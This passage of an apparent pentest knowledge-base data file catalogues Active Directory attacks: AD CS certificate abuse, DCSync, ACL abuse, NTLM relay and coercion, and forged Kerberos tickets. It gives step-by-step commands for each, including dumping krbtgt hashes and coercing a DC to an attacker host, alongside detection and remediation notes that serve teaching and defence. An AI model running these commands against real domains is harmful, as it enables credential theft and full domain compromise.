        theory: "theory/2026-08-18-adcs.html",
        description: "Misconfigured certificate templates or CA endpoints let an attacker obtain a certificate as anyone, then authenticate as them via PKINIT — often the shortest path to Domain Admin.",
        brief: "A certificate with a client-authentication EKU can be exchanged for a Kerberos TGT via PKINIT, so any AD CS misconfiguration that lets you enrol a certificate for an identity you should not control is a path to becoming that identity — frequently a domain admin or a DC.\n\nImpact: certificates are long-lived and survive password resets, making this both an escalation and a durable persistence primitive. The ESC1–ESC8 classes catalogue the misconfigurations; Certipy finds and exploits them.",
        quickReference: [
          { label: "Find vulnerable templates/CAs", cmd: "certipy find -u jdoe@corp.local -p 'Passw0rd' -dc-ip 10.10.10.10 -vulnerable -stdout" },
          { label: "ESC1 — request a cert as Administrator", cmd: "certipy req -u jdoe@corp.local -p 'Passw0rd' -ca CORP-CA -template VulnTemplate -upn administrator@corp.local" },
          { label: "Authenticate with the cert (PKINIT → TGT + NT hash)", cmd: "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10" },
          { label: "ESC8 — relay a coerced DC to the CA web endpoint", cmd: "ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController" }
        ],
        sections: [
          {
            title: "How It's Exploited (ESC1 walkthrough)",
            type: "commands",
            commands: [
              { label: "1. Enumerate the CA and templates for misconfigurations", cmd: "certipy find -u jdoe@corp.local -p 'Passw0rd' -dc-ip 10.10.10.10 -vulnerable -stdout\n# flags each template's ESC condition (ESC1..ESC8) and who can enrol" },
              { label: "2. ESC1 — the template lets the enrollee supply the subject (SAN)", cmd: "certipy req -u jdoe@corp.local -p 'Passw0rd' -dc-ip 10.10.10.10 \\\n  -ca CORP-CA -template VulnTemplate -upn administrator@corp.local\n#   -upn administrator@corp.local  request the cert AS the domain admin\n#   the client-auth EKU + ENROLLEE_SUPPLIES_SUBJECT makes this possible\n# outputs administrator.pfx" },
              { label: "3. Authenticate with the certificate via PKINIT", cmd: "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10\n# returns a TGT for Administrator AND (via UnPAC-the-hash) their NT hash" },
              { label: "4. ESC8 — coerce a DC and relay its auth to the CA web endpoint", cmd: "# terminal 1: relay to the certsrv web enrolment, ask for a DC-template cert\nntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n# terminal 2: coerce the DC's machine account to authenticate to us\nPetitPotam.py -u jdoe -p 'Passw0rd' attacker_ip dc01_ip\n# a DC certificate comes back -> certipy auth -pfx dc01.pfx -> DC TGT" },
              { label: "5. Use the identity", cmd: "certipy auth -pfx administrator.pfx   # or dc01.pfx\nexport KRB5CCNAME=administrator.ccache\nsecretsdump.py -k -no-pass dc01.corp.local" }
            ]
          },
          {
            title: "Key ESC Classes",
            type: "table",
            columns: ["ESC", "Misconfiguration"],
            rows: [
              ["ESC1", "Template: enrollee supplies subject (SAN) + client-auth EKU + low-priv enrol → request as anyone"],
              ["ESC2/3", "Any-Purpose / Enrollment Agent templates usable to authenticate as others"],
              ["ESC4", "Write access to a template object → reconfigure it into ESC1"],
              ["ESC6", "CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 → any request can set a SAN"],
              ["ESC7", "Dangerous rights over the CA itself (ManageCA / ManageCertificates)"],
              ["ESC8", "CA web enrolment accepts NTLM without EPA → relay a coerced DC for a cert"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "certipy find -vulnerable", "The exploitable ESC condition on a template/CA"],
              ["2", "Request a certificate for a privileged identity", "A .pfx as Administrator / a DC"],
              ["3", "certipy auth (PKINIT)", "TGT + NT hash of that identity"],
              ["4", "(ESC8) coerce DC + relay to CA", "DC certificate without any template misconfig"],
              ["5", "DCSync / act as the identity", "Domain compromise + durable cert persistence"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Certipy", "Enumerate (find) and exploit (req/auth) every ESC class"],
              ["ntlmrelayx.py", "--adcs relay to the CA web endpoint (ESC8)"],
              ["PetitPotam / Coercer", "Coerce a DC to authenticate for the relay"],
              ["Impacket secretsdump.py", "DCSync with the resulting TGT"],
              ["Certify / Rubeus", "Windows-side enrolment and PKINIT"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "SpecterOps — Certified Pre-Owned", url: "https://posts.specterops.io/certified-pre-owned-d95910965cd2" },
              { label: "Certipy wiki — ESC1–ESC16", url: "https://github.com/ly4k/Certipy/wiki" },
              { label: "The Hacker Recipes — AD CS", url: "https://www.thehacker.recipes/ad/movement/ad-cs" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Audit templates and the CA with Certipy/PSPKIAudit; remove ENROLLEE_SUPPLIES_SUBJECT where not genuinely required (ESC1).",
              "Enforce EPA and disable NTLM on the CA web enrolment endpoint (ESC8).",
              "Restrict template enrolment rights and CA management rights to the minimum (ESC4/ESC7).",
              "Clear the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA (ESC6); require manager approval on sensitive templates.",
              "Detect: certificates issued for a privileged SAN to a low-priv requester; enable CA issuance logging."
            ]
          }
        ]
      },
      {
        id: "dcsync-vuln",
        name: "DCSync",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1003/006/",
        theory: "theory/2026-08-18-dcsync.html",
        description: "A principal with replication rights asks a DC to replicate secrets, extracting any account's hashes — including krbtgt — without running code on the DC.",
        brief: "DCSync abuses the legitimate directory-replication protocol (MS-DRSR) that DCs use to sync with each other. Any principal holding DS-Replication-Get-Changes and Get-Changes-All on the domain object can request an account's secrets from a DC — over the network, with no code execution on the DC and no touching of NTDS.dit on disk.\n\nImpact: the prize is the krbtgt key, which enables Golden Tickets and durable domain persistence. Because replication rights are just ACEs, a non-admin granted them is a straight line to full compromise.",
        quickReference: [
          { label: "Dump everything (Impacket)", cmd: "secretsdump.py -just-dc corp.local/admin:'Passw0rd'@dc01" },
          { label: "Just krbtgt", cmd: "secretsdump.py -just-dc-user krbtgt corp.local/admin:'Passw0rd'@dc01" },
          { label: "NetExec", cmd: "netexec smb dc01 -u admin -p 'Passw0rd' --ntds" },
          { label: "Mimikatz", cmd: "lsadump::dcsync /domain:corp.local /user:krbtgt" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Confirm you hold replication rights on the domain object", cmd: "# BloodHound edge: DCSync / GetChanges + GetChangesAll on the domain\n# these come with Domain Admin, or can be granted directly to any principal (an ACL win)" },
              { label: "2. Replicate the krbtgt secret from a DC", cmd: "secretsdump.py -just-dc-user krbtgt corp.local/admin:'Passw0rd'@dc01\n#   -just-dc-user krbtgt   pull only the krbtgt account's hashes\n# note the NTLM hash AND the aes256 key for the Golden Ticket" },
              { label: "3. Or replicate every account (full NTDS over the wire)", cmd: "secretsdump.py -just-dc corp.local/admin:'Passw0rd'@dc01 -outputfile ntds\n# never touches NTDS.dit on disk; looks like normal DC replication" },
              { label: "4. Turn krbtgt into durable persistence (Golden Ticket)", cmd: "ticketer.py -nthash <krbtgt_nthash> -domain-sid <domain_sid> -domain corp.local Administrator\nexport KRB5CCNAME=Administrator.ccache   # forge TGTs for anyone, survives password resets" }
            ]
          },
          {
            title: "Rights That Permit It",
            type: "table",
            columns: ["Right", "Purpose"],
            rows: [
              ["DS-Replication-Get-Changes", "Replicate standard directory data"],
              ["DS-Replication-Get-Changes-All", "Replicate SECRET attributes — the one that yields hashes"],
              ["Held by default", "Domain Admins, Enterprise Admins, and DCs"],
              ["The real risk", "A non-admin principal granted these via an ACL"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Obtain a principal with replication rights", "DCSync capability"],
              ["2", "Request krbtgt (and/or all) secrets from a DC", "Hashes without touching the DC disk"],
              ["3", "Pass-the-hash / crack DA hashes", "Immediate high privilege"],
              ["4", "Forge a Golden Ticket with the krbtgt key", "Durable, domain-wide persistence"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket secretsdump.py", "DCSync over MS-DRSR (-just-dc)"],
              ["NetExec", "--ntds convenience wrapper"],
              ["Mimikatz", "lsadump::dcsync from a Windows host"],
              ["Impacket ticketer.py", "Forge a Golden Ticket from the krbtgt key"],
              ["BloodHound", "Find non-admins that hold replication rights"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1003.006 — DCSync", url: "https://attack.mitre.org/techniques/T1003/006/" },
              { label: "The Hacker Recipes — DCSync", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Audit replication rights on the domain object; only DCs and top-tier admins should hold Get-Changes-All.",
              "Rotate the krbtgt password twice (with a replication interval between) after any suspected Tier-0 compromise.",
              "Protect Tier-0 accounts and keep them off lower-tier systems.",
              "Detect: DRSGetNCChanges (replication) requests from source IPs that are not domain controllers — the primary signal.",
              "Alert on unexpected new DC objects (catches the DCShadow write-side variant)."
            ]
          }
        ]
      },
      {
        id: "ad-acl-abuse",
        name: "Dangerous AD ACLs",
        severity: "High",
        ref: "https://bloodhound.readthedocs.io/",
        theory: "theory/2026-08-18-acls-dacls.html",
        description: "Over-permissive object permissions (GenericAll, WriteDACL, ForceChangePassword) chain across objects into a path to Domain Admin.",
        brief: "Access to AD objects is governed by ACLs, and a small set of rights can be turned into control of the object they sit on. In a large domain these accumulate for years, and a single misconfigured ACE can be the first link in a multi-hop path from a low-priv foothold to Domain Admin.\n\nImpact: BloodHound computes these chains automatically; each dangerous right converts to password reset, group addition, targeted Kerberoast/AS-REP, RBCD, Shadow Credentials, or DCSync.",
        quickReference: [
          { label: "Find paths (BloodHound)", cmd: "SharpHound / bloodhound-python -> 'Shortest Path to Domain Admins'" },
          { label: "Reset a password (ForceChangePassword)", cmd: "bloodyAD -u jdoe -p 'Passw0rd' -d corp.local set password TARGET 'NewPass123!'" },
          { label: "Add self to a group (GenericAll/AddMember)", cmd: "bloodyAD -u jdoe -p 'Passw0rd' -d corp.local add groupMember 'Helpdesk Admins' jdoe" },
          { label: "Grant yourself DCSync (WriteDACL on domain)", cmd: "dacledit.py -action write -rights DCSync -principal jdoe -target-dn 'DC=corp,DC=local' corp.local/jdoe:'Passw0rd'" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Map outbound control from your foothold", cmd: "# collect then, in BloodHound, mark your user Owned and run:\n#   Shortest Path from Owned Principals / Outbound Object Control\n# each edge (GenericAll, WriteDacl, ForceChangePassword, AddMember...) is an action" },
              { label: "2. ForceChangePassword — take over a user", cmd: "bloodyAD -u jdoe -p 'Passw0rd' -d corp.local set password TARGET 'NewPass123!'\n# then authenticate as TARGET" },
              { label: "3. GenericWrite over a user — targeted Kerberoast or Shadow Credentials", cmd: "# add an SPN and roast:\nbloodyAD -u jdoe -p pass -d corp.local set object TARGET servicePrincipalName -v 'fake/svc'\n# or write a Shadow Credential (no password reset needed):\npywhisker -d corp.local -u jdoe -p pass --target TARGET --action add" },
              { label: "4. GenericAll over a computer — RBCD to full takeover", cmd: "# see the RBCD entry: write msDS-AllowedToActOnBehalfOfOtherIdentity and impersonate" },
              { label: "5. WriteDACL over the domain — grant yourself DCSync", cmd: "dacledit.py -action write -rights DCSync -principal jdoe \\\n  -target-dn 'DC=corp,DC=local' corp.local/jdoe:'Passw0rd'\n# then secretsdump.py -just-dc" }
            ]
          },
          {
            title: "Dangerous Rights",
            type: "table",
            columns: ["Right", "Turns into"],
            rows: [
              ["GenericAll", "Full control — reset password, add SPN, write any attribute"],
              ["GenericWrite", "Targeted Kerberoast, Shadow Credentials, logon-script abuse"],
              ["WriteDACL", "Grant yourself GenericAll or DCSync, then anything"],
              ["WriteOwner", "Take ownership, then rewrite the DACL"],
              ["ForceChangePassword", "Reset the target's password without the current one"],
              ["AddMember", "Add yourself to a privileged group"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "BloodHound outbound control from foothold", "The dangerous ACE and the path"],
              ["2", "Exercise the first right (reset / add SPN / add member)", "Control of the next principal"],
              ["3", "Repeat across the chain", "Escalation hop by hop"],
              ["4", "Reach a Tier-0 right (WriteDACL on domain / group)", "DCSync or Domain Admin membership"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["BloodHound / SharpHound", "Compute the ACL attack paths"],
              ["bloodyAD", "Reset passwords, add group members, write attributes"],
              ["Impacket dacledit.py", "Grant rights / DCSync via ACL edits"],
              ["pyWhisker", "Shadow Credentials via msDS-KeyCredentialLink"],
              ["PowerView", "Enumerate and abuse ACLs from Windows"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "BloodHound docs — edges/abuse", url: "https://bloodhound.readthedocs.io/" },
              { label: "The Hacker Recipes — ACL abuse", url: "https://www.thehacker.recipes/ad/movement/dacl" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Run BloodHound yourself and prune the dangerous edges and shortest paths to Tier-0.",
              "Apply least privilege on delegation of administration — grant the narrowest right over the smallest scope.",
              "Adopt a tiered administration model so a low-tier ACL win cannot reach high-tier accounts.",
              "Monitor DACL modifications (event 5136) on sensitive objects and watch AdminSDHolder for persistence.",
              "Review and remove inherited/legacy ACEs regularly."
            ]
          }
        ]
      },
      {
        id: "ntlm-relay-vuln",
        name: "NTLM Relay & Coercion",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1557/001/",
        theory: "theory/2026-08-18-coercion-ntlm-relay.html",
        description: "Authentication is captured or coerced, then relayed live to a service missing its relay protection (SMB, LDAP, AD CS) to act as the victim.",
        brief: "NTLM relay takes an authentication a victim was tricked into starting and forwards it, in real time, to a service that will accept it — acting as the victim there. Coercion makes it reliable: certain RPC methods force a target (ideally a DC's machine account) to authenticate on command.\n\nImpact: relaying succeeds only where a protection is missing — SMB signing off, LDAP channel binding off, or EPA not enforced on AD CS web enrolment. Coercing a DC and relaying to AD CS (ESC8) is a leading path to domain compromise.",
        quickReference: [
          { label: "Find SMB targets without signing", cmd: "netexec smb 10.0.0.0/24 --gen-relay-list targets.txt" },
          { label: "Poison + capture/relay", cmd: "responder -I eth0 -A   (analyze) ; set SMB/HTTP Off to relay" },
          { label: "Relay to LDAP for RBCD", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access -smb2support" },
          { label: "Coerce a host to authenticate", cmd: "coercer coerce -t dc01 -l attacker_ip -u jdoe -p 'Passw0rd' -d corp.local" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Enumerate relay targets (missing protection is the whole game)", cmd: "# hosts without SMB signing are relayable:\nnetexec smb 10.0.0.0/24 --gen-relay-list targets.txt" },
              { label: "2. Stand up the relay, then generate the authentication", cmd: "# relay to SMB targets and drop to an interactive session on success\nntlmrelayx.py -tf targets.txt -smb2support -i\n# obtain the auth by poisoning (Responder) or by coercion (below)" },
              { label: "3. Coerce a DC to authenticate to you (deterministic)", cmd: "coercer coerce -t dc01 -l attacker_ip -u jdoe -p 'Passw0rd' -d corp.local\n#   -t target to coerce, -l where it should authenticate back to\n# sprays MS-RPRN/MS-EFSRPC/MS-DFSNM/MS-FSRVP" },
              { label: "4. ESC8 — relay the DC's auth to AD CS for a certificate", cmd: "ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n# the DC cert -> certipy auth -> DC TGT -> domain compromise" },
              { label: "5. Or relay to LDAP and configure RBCD on the coerced machine", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access -smb2support\n# then getST.py -impersonate Administrator against the coerced host" }
            ]
          },
          {
            title: "Relay Targets & Conditions",
            type: "table",
            columns: ["Target", "Requires / yields"],
            rows: [
              ["SMB", "SMB signing NOT required → SAM/LSA dump, command execution"],
              ["LDAP / LDAPS", "Channel binding off → RBCD, Shadow Credentials, DCSync rights"],
              ["AD CS web (ESC8)", "EPA not enforced → a certificate as the victim → a TGT"],
              ["Rule", "You cannot relay auth back to the host it came from — relay elsewhere"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a service missing its relay protection", "A valid relay target"],
              ["2", "Coerce/poison a victim to authenticate to you", "Live NTLM authentication in hand"],
              ["3", "Relay it to the target (SMB/LDAP/AD CS)", "Action as the victim"],
              ["4", "ESC8: DC auth → CA cert; or LDAP → RBCD", "DC TGT / host takeover"],
              ["5", "DCSync / impersonate", "Domain compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Responder", "LLMNR/NBT-NS poisoning to capture/relay"],
              ["Coercer / PetitPotam / PrinterBug", "Force a target to authenticate on demand"],
              ["Impacket ntlmrelayx.py", "Relay the authentication to SMB/LDAP/AD CS"],
              ["NetExec", "--gen-relay-list to find unsigned SMB hosts"],
              ["Certipy", "Turn a relayed AD CS certificate into a TGT"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1557.001 — LLMNR/NBT-NS Poisoning and Relay", url: "https://attack.mitre.org/techniques/T1557/001/" },
              { label: "The Hacker Recipes — NTLM relay", url: "https://www.thehacker.recipes/ad/movement/ntlm/relay" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Require SMB signing everywhere — the single most important control; it breaks SMB relay.",
              "Enforce LDAP channel binding and signing to close the RBCD/Shadow-Credential relay paths.",
              "Enable EPA on AD CS web enrolment and disable NTLM there to kill ESC8.",
              "Disable the Print Spooler on DCs and disable LLMNR/NBT-NS to remove coercion and poisoning triggers.",
              "Detect: authentication from a DC machine account to an unexpected host; patch coercion methods as they appear."
            ]
          }
        ]
      },
      {
        id: "kerberos-ticket-attacks",
        name: "Golden, Silver & Diamond Tickets",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1558/001/",
        theory: "theory/2026-08-18-kerberos.html",
        description: "With stolen key material, forge Kerberos tickets — a Silver ticket for one service, a Golden ticket for the whole domain, a Diamond ticket to evade detection.",
        brief: "Once key material is stolen, an attacker stops requesting tickets and forges them. A Silver Ticket is a forged service ticket (from a service account key), accepted by that one service without contacting the DC. A Golden Ticket is a forged TGT (from the krbtgt key) that impersonates anyone domain-wide and survives password resets. A Diamond Ticket modifies a real TGT to look legitimate.\n\nImpact: these are the persistence endgame of AD compromise — which is why krbtgt theft means the domain must be considered fully compromised until krbtgt is rotated twice.",
        quickReference: [
          { label: "Golden Ticket (krbtgt key)", cmd: "ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain corp.local Administrator" },
          { label: "Silver Ticket (service key)", cmd: "ticketer.py -nthash <service_hash> -domain-sid <sid> -domain corp.local -spn cifs/srv01 Administrator" },
          { label: "Overpass-the-Hash (NT hash → TGT)", cmd: "getTGT.py corp.local/svc -hashes :<nthash>" },
          { label: "Pass-the-Ticket", cmd: "export KRB5CCNAME=ticket.ccache   (then -k -no-pass)" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Overpass-the-Hash — turn an NT hash into a real TGT", cmd: "getTGT.py corp.local/svc -hashes :<nthash>\nexport KRB5CCNAME=svc.ccache\n# from here you use Kerberos, which looks entirely normal" },
              { label: "2. Silver Ticket — forge a service ticket with a service/computer key", cmd: "ticketer.py -nthash <service_or_machine_hash> -domain-sid <domain_sid> \\\n  -domain corp.local -spn cifs/srv01.corp.local Administrator\n#   -spn        the single service the ticket is valid for\n# the KDC is never contacted at use time -> minimal telemetry" },
              { label: "3. Golden Ticket — forge a TGT with the krbtgt key (from DCSync)", cmd: "ticketer.py -nthash <krbtgt_nthash> -aesKey <krbtgt_aes256> \\\n  -domain-sid <domain_sid> -domain corp.local Administrator\nexport KRB5CCNAME=Administrator.ccache\n# impersonate anyone, including fabricated admins; survives password resets" },
              { label: "4. Diamond Ticket — modify a real TGT (stealthier than Golden)", cmd: "# request a legit TGT, decrypt with the krbtgt key, edit the PAC, re-encrypt\nRubeus.exe diamond /krbkey:<krbtgt_aes> /user:jdoe /password:pass \\\n  /ticketuser:Administrator /ticketuserid:500 /groups:512\n# the ticket has a matching legitimate 4768 request -> harder to spot" },
              { label: "5. Use the forged ticket", cmd: "psexec.py -k -no-pass dc01.corp.local   # or secretsdump / any Kerberos tool" }
            ]
          },
          {
            title: "The Family",
            type: "table",
            columns: ["Attack", "Key needed / scope"],
            rows: [
              ["Overpass-the-Hash", "A user's NT hash → a legitimate TGT for that user"],
              ["Pass-the-Ticket", "A stolen TGT/service ticket → reuse its access"],
              ["Silver Ticket", "A service/computer key → forge a ticket for that one service (very stealthy)"],
              ["Golden Ticket", "The krbtgt key → forge TGTs for anyone, domain-wide, durable"],
              ["Diamond Ticket", "The krbtgt key → modify a real TGT (evades 'ticket with no request' detection)"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Steal key material (DCSync krbtgt / dump a service key)", "The signing key for forgery"],
              ["2", "Forge the appropriate ticket", "Golden (domain) / Silver (one service)"],
              ["3", "Pass-the-ticket into a session", "Authenticated as the impersonated principal"],
              ["4", "Act (DCSync, PsExec, data access)", "Domain-wide control / persistence"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket ticketer.py", "Forge Golden/Silver tickets"],
              ["Rubeus", "diamond/golden/silver, ptt, asktgt (overpass-the-hash)"],
              ["Mimikatz", "kerberos::golden, sekurlsa::pth, ptt"],
              ["Impacket getTGT.py / secretsdump", "Overpass-the-hash and obtain krbtgt"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1558.001 — Golden Ticket", url: "https://attack.mitre.org/techniques/T1558/001/" },
              { label: "The Hacker Recipes — Forged tickets", url: "https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Protect the krbtgt key; rotate it twice (with a replication interval) after any suspected Tier-0 compromise.",
              "Isolate Tier-0 credentials so TGTs and service keys cannot be stolen from ordinary workstations.",
              "Keep Kerberos ticket lifetimes short; enable Credential Guard to make key extraction from LSASS far harder.",
              "Detect: tickets used with no matching 4768/4769 request on the DC (Golden/Silver), anomalous ticket lifetimes, and impossible group claims in the PAC.",
              "Silver Tickets are hardest to detect — enforce SMB signing and monitor service-account behaviour."
            ]
          }
        ]
      },
      {
        id: "authentication-coercion",
        name: "Authentication Coercion (Forced Authentication)",
        severity: "High",
        ref: "https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications",
        description: "Built-in Windows RPC interfaces can be abused to force a target machine — often a domain controller — to authenticate to an attacker-controlled host, yielding its machine-account authentication for relay or capture.",
        brief: "Several Windows RPC interfaces expose methods that take a server or UNC path and then connect to it authenticated as the calling machine's computer account. That is legitimate functionality — a print server checking a remote spooler, EFS talking to a file server — but it means an attacker who can reach the interface can name their own host as the destination and coerce the target into authenticating to them. No credentials are needed to trigger it, only network access to the RPC endpoint.\n\nThe coerced authentication is then used two ways. It can be relayed (NTLM relay) onward to a service that doesn't enforce signing/channel binding — LDAP, AD CS web enrollment (ESC8), or SMB — to act as the victim machine. Or, if the attacker controls a host trusted for unconstrained delegation, the victim's TGT is captured from the authentication and reused. Coercing a domain controller this way is a common path from a low-privileged foothold to domain compromise. The named primitives (Printer Bug, PetitPotam and others) are all instances of the same coercion class.",
        quickReference: [
          { label: "MS-RPRN (Printer Bug)", cmd: "SpoolSample.exe <target-DC> <attacker-host>" },
          { label: "MS-EFSR (PetitPotam)", cmd: "Coerce via EfsRpcOpenFileRaw to \\\\attacker-host\\share" },
          { label: "Capture (unconstrained deleg.)", cmd: "Rubeus monitor /interval:5 -> victim TGT" },
          { label: "Relay onward", cmd: "ntlmrelayx -t ldap(s)://dc  or  http://ca/certsrv (ESC8)" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Coerce the target to authenticate (Printer Bug, MS-RPRN)", cmd: "# force <target> to authenticate to <listener> as <target>$ (machine account)\nSpoolSample.exe <dc> <listener-host>\n# via Sliver: execute-assembly the SpoolSample .NET binary in memory" },
              { label: "1-alt. Coerce via other RPC surfaces", cmd: "# MS-EFSR (PetitPotam), MS-FSRVP, MS-DFSNM all expose coercion methods:\nPetitPotam.exe <listener> <target>\n# tooling such as Coercer sweeps multiple methods automatically" },
              { label: "2a. Capture path — host trusted for unconstrained delegation", cmd: "# on a host with unconstrained delegation, monitor for the incoming TGT:\nRubeus.exe monitor /interval:5 /nowrap\n# coerce the DC -> its TGT lands in the listener's memory -> ptt and DCSync" },
              { label: "2b. Relay path — forward the auth to a vulnerable service", cmd: "# relay the coerced machine auth to LDAP (RBCD) or AD CS web enrollment (ESC8):\nntlmrelayx.py -t ldaps://<dc> --delegate-access      # write RBCD on the DC object\nntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs    # ESC8 -> machine cert -> TGT" },
              { label: "3. Use the resulting privilege", cmd: "# captured/relayed as the DC machine account or a DA -> DCSync, RBCD S4U, or a cert-based TGT\nRubeus.exe asktgt /user:<dc>$ /certificate:<pfx> /ptt   # (ESC8 result)" }
            ]
          },
          {
            title: "Why It Works",
            type: "notes",
            items: [
              "The coercion methods are legitimate RPC functionality: each takes a caller-supplied server/UNC path and connects to it, and Windows authenticates that outbound connection automatically as the machine account. Naming an attacker host as the destination is a valid call, so the primitive cannot simply be patched away without breaking the feature.",
              "Machine accounts authenticate with a password the OS manages, so no attacker credentials are required to obtain a high-value authentication — only the ability to invoke the RPC method.",
              "The coerced authentication is only useful because a second weakness accepts it: a downstream service without SMB/LDAP signing or channel binding (relay), or a host configured for unconstrained delegation that stores the resulting TGT (capture). Coercion is the trigger; the accepting service is the vulnerability it chains into.",
              "Domain controllers are the highest-value target because their machine account has directory-replication (DCSync) rights, so coercing a DC and relaying/capturing its authentication frequently equals domain compromise."
            ]
          },
          {
            title: "Coercion Primitives",
            type: "table",
            columns: ["Interface / name", "Trigger"],
            rows: [
              ["MS-RPRN (Printer Bug)", "RpcRemoteFindFirstPrinterChangeNotification — the classic spooler coercion (SpoolSample / Dementor)"],
              ["MS-EFSR (PetitPotam)", "EfsRpcOpenFileRaw and related EFS methods — often works unauthenticated"],
              ["MS-FSRVP", "Shadow-copy RPC coercion (ShadowCoerce)"],
              ["MS-DFSNM", "DFS namespace management coercion (DFSCoerce)"],
              ["Automation", "Coercer / PetitPotam sweep multiple methods to find one that is reachable"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["SpoolSample / Dementor", "Trigger the MS-RPRN Printer Bug coercion"],
              ["PetitPotam / Coercer", "Trigger MS-EFSR and sweep multiple coercion methods"],
              ["Rubeus (monitor)", "Capture a coerced TGT on an unconstrained-delegation host"],
              ["ntlmrelayx (Impacket)", "Relay the coerced NTLM auth to LDAP / AD CS / SMB"],
              ["Sliver (execute-assembly)", "Run SpoolSample / Rubeus in memory from a foothold"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "The Hacker Recipes — Coerced authentications", url: "https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications" },
              { label: "MITRE ATT&CK — Forced Authentication (T1187)", url: "https://attack.mitre.org/techniques/T1187/" },
              { label: "Microsoft — KB5005413 (mitigating NTLM relay to AD CS)", url: "https://support.microsoft.com/en-us/topic/kb5005413" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Enforce SMB signing and LDAP signing + channel binding everywhere so coerced NTLM cannot be relayed onward.",
              "Enable Extended Protection for Authentication (EPA) on AD CS web enrollment and other HTTP services to break the ESC8 relay chain.",
              "Remove unconstrained delegation; where delegation is required, use constrained or resource-based constrained delegation and protect sensitive accounts (add DAs to Protected Users / mark 'account is sensitive and cannot be delegated').",
              "Restrict and monitor the coercion RPC surfaces (disable the Print Spooler where it is not needed, filter RPC at the network edge, watch for anomalous machine-account authentications to non-infrastructure hosts).",
              "Apply the vendor mitigations for the named primitives, but treat the class — not any single CVE — as the thing to defend against."
            ]
          }
        ]
      },
      {
        id: "security-descriptor-backdoor",
        name: "Security Descriptor / ACL Backdoors",
        severity: "High",
        ref: "https://cube0x0.github.io/Pocing-Beyond-DA/",
        description: "An attacker with administrative access rewrites the security descriptors on remote-access subsystems (WMI, WinRM, services, registry, DCOM) to grant a low-privileged principal stealthy, file-less remote code execution rights.",
        brief: "Most Windows remote-management surfaces — the WMI namespaces, WinRM/PSRemoting, the Service Control Manager, the remote registry, and DCOM — guard access with their own security descriptor (a DACL) that is evaluated when a caller connects. An attacker who already has admin on a host (or on a DC) can edit those descriptors to add an ACE granting a chosen low-privileged user the rights needed to execute code remotely. Afterwards that ordinary user can come back over WMI or PSRemoting and run commands as though they were an administrator.\n\nWhat makes this a durable backdoor is what it is not: no new account is created, no binary or service is dropped, no membership is added to a privileged group. It is a permissions change on components that are supposed to be there, so account-, file- and group-based detection all miss it. The RACE toolkit automates the common variants (remote WMI and PSRemoting descriptors); the same idea applies to service, registry and DCOM ACLs.",
        quickReference: [
          { label: "Backdoor remote WMI", cmd: "Set-RemoteWMI -SamAccountName <user> -ComputerName <host> -namespace 'root\\cimv2'" },
          { label: "Backdoor PSRemoting", cmd: "Set-RemotePSRemoting -SamAccountName <user> -ComputerName <host>" },
